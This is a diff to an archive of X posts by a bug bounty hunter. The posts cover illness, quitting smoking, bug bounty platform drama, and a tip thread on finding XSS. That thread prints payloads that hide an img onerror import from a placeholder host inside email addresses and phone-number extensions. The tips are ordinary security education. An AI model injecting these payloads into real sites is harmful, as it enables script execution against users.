@@ -2,8 +2,8 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 408
-- Conversations/threads: 370
+- Posts in this file: 418
+- Conversations/threads: 371
 - Oldest post captured: 2015-08-11
 - Newest post captured: 2026-11-09
 
@@ -1588,7 +1588,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 
 ---
 
-## 2024-07-03 · Post · Holy moly this sickness bug hitting my house is something else. This year has truly sucked ! Brighte
+## 2024-07-03 · Thread · Holy moly this sickness bug hitting my house is something else. This year has truly sucked ! Brighte
 
 
 ### Post — @zseano — 2024-07-03 18:14 UTC (2024-07-03 19:14 WAT)
@@ -1597,6 +1597,43 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 - Metrics (at fetch): bookmark 0, impression 11012, like 48, quote 0, reply 4, retweet 0
 
 > Holy moly this sickness bug hitting my house is something else. This year has truly sucked ! Brighter days ahead…. Hahaha who am I kidding I have this for many years to come. Fml.
+
+
+### Thread part 2 — @zseano — 2024-07-07 18:24 UTC (2024-07-07 19:24 WAT)
+
+- URL: https://x.com/zseano/status/1810017087940628616
+- Metrics (at fetch): bookmark 1, impression 3551, like 9, quote 0, reply 4, retweet 0
+
+> When I smoked I would never get ill.. but now I seem to catch something at least once a month 🤷‍♂️  this stomach bug is truly awful. maybe I’ll start smoking again 😂
+
+
+### Thread part 3 — @zseano — 2024-07-08 07:42 UTC (2024-07-08 08:42 WAT)
+
+- URL: https://x.com/zseano/status/1810217919927746997
+- Metrics (at fetch): bookmark 0, impression 4832, like 6, quote 0, reply 2, retweet 0
+
+> Wish I’d just stop throwing up now, had enough of this shit. Can’t keep anything down at all 🤒
+
+
+### Thread part 4 — @zseano — 2024-07-13 08:54 UTC (2024-07-13 09:54 WAT)
+
+- URL: https://x.com/zseano/status/1812047938304004135
+- Metrics (at fetch): bookmark 0, impression 3934, like 37, quote 0, reply 4, retweet 0
+
+> Finally back to “normal” and can eat properly again. Worse sickness bug I’ve ever had jeeeeez. Hopefully that’s me done being ill for the year 🙏😂 back to hacking!
+
+
+---
+
+## 2024-07-09 · Reply · @b3n3dit_g0ds0n3 Tobacco did not help with work at all. Id never smoke to get in the “zone”, it was 
+
+
+### Post — @zseano — 2024-07-09 11:41 UTC (2024-07-09 12:41 WAT)
+
+- URL: https://x.com/zseano/status/1810640372680540480
+- Metrics (at fetch): bookmark 0, impression 405, like 3, quote 0, reply 2, retweet 0
+
+> @b3n3dit_g0ds0n3 Tobacco did not help with work at all. Id never smoke to get in the “zone”, it was just an addiction. Cannabis at first use to help me be creative &amp; focus on tasks, but I abused it for over ten years and ultimately it fucked me up. Overall I’m glad my smoking days are behind me🙌
 
 
 ---
@@ -1630,10 +1667,10 @@ Tags (automatic): IDOR / BOLA, Platform: HackerOne
 
 ---
 
-## 2024-04-27 · Post · XSS in an email address is underrated. (email is rarely sanitized by companies). Use catch-all and t
+## 2024-04-27 · Thread · XSS in an email address is underrated. (email is rarely sanitized by companies). Use catch-all and t
 
 
-Tags (automatic): XSS
+Tags (automatic): XSS, Request smuggling / desync
 
 
 ### Post — @zseano — 2024-04-27 20:25 UTC (2024-04-27 21:25 WAT)
@@ -1646,7 +1683,49 @@ Tags (automatic): XSS
 > "&gt;&lt;img/src/onerror=import('//domain/')&gt;"@yourdomain
 > .com
 >
-> cc @BRuteLogic - https://t.co/HlFDweFQx6
+> cc @BRuteLogic - https://brutelogic.com.br/blog/xss-limited-input-formats/
+
+**Links in post:** https://brutelogic.com.br/blog/xss-limited-input-formats/
+
+
+### Thread part 2 — @zseano — 2024-04-27 20:29 UTC (2024-04-27 21:29 WAT)
+
+- URL: https://x.com/zseano/status/1784318930779087241
+- Metrics (at fetch): bookmark 95, impression 6599, like 111, quote 0, reply 3, retweet 15
+
+> Also phone numbers using ";ext=" (there's more, see video), which are considered valid numbers. Again these are rarely sanitized 
+>
+> 013371337;ext=&lt;img/src/onerror=import('//domain/')&gt;
+>
+> cc @securinti - https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0&ab_channel=NahamSec [pic.x.com/8mhe2T04S8]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GMMsl38XEAA9BGy.jpg — no alt text provided by author
+
+**Links in post:** https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0&ab_channel=NahamSec
+
+
+### Thread part 3 — @zseano — 2024-04-27 20:31 UTC (2024-04-27 21:31 WAT)
+
+- URL: https://x.com/zseano/status/1784319417481851367
+- Metrics (at fetch): bookmark 14, impression 6999, like 35, quote 0, reply 2, retweet 0
+
+> @securinti Why are they rarely sanitized? Devs don't think people can smuggle xss payloads in both these context. As pointed out in @BRuteLogic's blog post, the email above is considered VALID.. and that's all devs are usually checking for. Is this a valid email? If yes, then allow
+
+
+### Thread part 4 — @zseano — 2024-04-27 20:34 UTC (2024-04-27 21:34 WAT)
+
+- URL: https://x.com/zseano/status/1784320275577729440
+- Metrics (at fetch): bookmark 50, impression 7558, like 63, quote 1, reply 2, retweet 5
+
+> @securinti @BRuteLogic Same for phone numbers, ;ext=, ;phone-context= etc are considered "valid" parts of a phone number. :)
+>
+> https://datatracker.ietf.org/doc/html/rfc5341 [pic.x.com/0Tr2ovOMs8]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GMMtYd3WQAAwOdx.png — no alt text provided by author
+
+**Links in post:** https://datatracker.ietf.org/doc/html/rfc5341
 
 
 ---
@@ -1849,10 +1928,10 @@ Tags (automatic): Platform: HackerOne
 
 ---
 
-## 2023-02-08 · Post · Tweeting this out to warn others, as the original tweet is deleted. 
+## 2023-02-08 · Thread · Tweeting this out to warn others, as the original tweet is deleted. 
 
 
-Tags (automatic): XSS
+Tags (automatic): XSS, Platform: HackerOne, Platform: Bugcrowd
 
 
 ### Post — @zseano — 2023-02-08 17:45 UTC (2023-02-08 18:45 WAT)
@@ -1870,6 +1949,14 @@ Tags (automatic): XSS
 
 **Media:**
 - photo: https://pbs.twimg.com/media/FodlNmMXEB4IF54.jpg — no alt text provided by author
+
+
+### Thread part 2 — @zseano — 2023-02-08 17:47 UTC (2023-02-08 18:47 WAT)
+
+- URL: https://x.com/zseano/status/1623377899498704908
+- Metrics (at fetch): bookmark 1, impression 18572, like 86, quote 1, reply 8, retweet 1
+
+> Bug bounty programs should enforce a strict policy to not allow the use of managed blind xss platforms. This is putting their customers at risk from private data being shared with third parties they have no control over. Cc @Hacker0x01 @bugcrowd @intigriti @yeswehack
 
 
 ---
@@ -2228,7 +2315,7 @@ Tags (automatic): Platform: HackerOne
 
 ---
 
-## 2022-07-01 · Post · wow someone working for hackerone triage abused their power to try score some bounties. pathetic.. h
+## 2022-07-01 · Thread · wow someone working for hackerone triage abused their power to try score some bounties. pathetic.. h
 
 
 Tags (automatic): Platform: HackerOne
@@ -2255,9 +2342,17 @@ Tags (automatic): Platform: HackerOne
     
 
 
+### Thread part 2 — @zseano — 2022-07-01 21:49 UTC (2022-07-01 22:49 WAT)
+
+- URL: https://x.com/zseano/status/1542988838896902144
+- Metrics (at fetch): bookmark 0, impression 0, like 31, quote 0, reply 0, retweet 0
+
+> Kudos to the HackerOne team for the transparency and action taken here. Also nice job of the company to act on their suspicions &amp; act accordingly :)
+
+
 ---
 
-## 2022-06-04 · Post · we joke about critical clickjacking but metamask just paid $120,000 for a clickjacking bug :o https:
+## 2022-06-04 · Thread · we joke about critical clickjacking but metamask just paid $120,000 for a clickjacking bug :o https:
 
 
 ### Post — @zseano — 2022-06-04 00:34 UTC (2022-06-04 01:34 WAT)
@@ -2280,6 +2375,14 @@ Tags (automatic): Platform: HackerOne
     >
     > https://t.co/pn0uAYI79Y
     
+
+
+### Thread part 2 — @zseano — 2022-06-04 00:35 UTC (2022-06-04 01:35 WAT)
+
+- URL: https://x.com/zseano/status/1532883831358906370
+- Metrics (at fetch): bookmark 0, impression 0, like 17, quote 0, reply 2, retweet 0
+
+> oh just realised i've used a keyword the bots like to reply spam on.. ;D
 
 
 ---
